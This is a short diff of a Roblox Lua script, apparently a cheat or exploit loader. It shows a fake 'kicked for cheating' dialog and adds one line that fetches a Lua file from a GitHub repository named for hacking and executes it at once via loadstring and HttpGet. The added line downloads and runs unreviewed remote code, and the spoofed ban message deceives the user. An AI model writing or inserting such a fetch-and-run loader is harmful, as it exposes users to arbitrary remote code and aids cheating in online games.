@@ -3,3 +3,4 @@ PromptLib("Disconnected","You were kicked from this experience:\nBanned For Chea
     {Text = "Close",LayoutOrder = 0,Primary = true,Callback = function()
     end},
 },true)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HackerTheBestYTB/ScriptRoblox/test/AutoPolice.lua"))()
